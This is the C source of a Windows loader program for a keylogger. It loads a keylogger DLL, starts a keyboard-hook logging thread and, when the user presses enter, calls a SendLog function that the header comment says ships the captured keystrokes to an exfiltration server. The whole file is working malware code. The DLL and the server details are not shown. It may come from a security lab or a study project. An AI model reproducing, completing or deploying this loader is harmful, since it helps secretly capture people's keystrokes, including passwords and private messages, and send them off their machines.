/***************************************************************************************************
* Base program to load Keylogger DLL and begin logging
* After setting hook, waits for user to press enter before unloading the hook to give time to log keys
* This program is responsible for calling function to send the resulting data to the waiting exfil server
****************************************************************************************************/

#include <Windows.h>

typedef VOID (*LPHOOKFUNC)();
typedef DWORD (*LPSENDLOG)();

INT main()
{
	HANDLE hConsoleOut = INVALID_HANDLE_VALUE;
	hConsoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hConsoleIn = INVALID_HANDLE_VALUE;
	hConsoleIn = GetStdHandle(STD_INPUT_HANDLE);
	HMODULE hKeyloggerDll = NULL;
	LPHOOKFUNC lpStartLogging = NULL;
	LPSENDLOG lpSendLog = NULL;
	HANDLE hThreadHandle = NULL;
	DWORD dwErrorCode = 0;

	hKeyloggerDll = LoadLibraryW(L"KeyloggerDLL.dll");
	if (NULL == hKeyloggerDll)
	{
		dwErrorCode = GetLastError();
		WriteConsole(hConsoleOut, TEXT("ERROR: Could not load KeyloggerDLL.dll\n"), 39, NULL, NULL);
		return dwErrorCode;
	}

	lpStartLogging = (LPHOOKFUNC)GetProcAddress(hKeyloggerDll, "StartLogging");
	if (NULL == lpStartLogging) {
		dwErrorCode = GetLastError();
		WriteConsole(hConsoleOut, TEXT("ERROR: Could not find StartLogging function in KeyloggerDLL.dll\n"), 64, NULL, NULL);
		return dwErrorCode;
	}

	lpSendLog = (LPSENDLOG)GetProcAddress(hKeyloggerDll, "SendLog");
	if (NULL == lpSendLog) {
		dwErrorCode = GetLastError();
		WriteConsole(hConsoleOut, TEXT("ERROR: Could not find SendLog function in KeyloggerDLL.dll\n"), 59, NULL, NULL);
		return dwErrorCode;
	}

	hThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpStartLogging, NULL, 0, NULL);
	if (NULL == hThreadHandle) {
		dwErrorCode = GetLastError();
		WriteConsole(hConsoleOut, TEXT("ERROR: Error occurred starting logging thread\n"), 46, NULL, NULL);
		return dwErrorCode;
	}

	WriteConsole(hConsoleOut, TEXT("DLL should be loaded. Logging started.\n"), 39, NULL, NULL);
	WriteConsole(hConsoleOut, TEXT("Press enter when finished\n"), 26, NULL, NULL);

	WCHAR wcBuff[1];
	SecureZeroMemory(wcBuff, 1);
	DWORD dwCharsRead = 0;
	ReadConsole(hConsoleIn, wcBuff, 1, &dwCharsRead, NULL);
	dwErrorCode = lpSendLog();
	FreeLibrary(hKeyloggerDll);
	return dwErrorCode;
}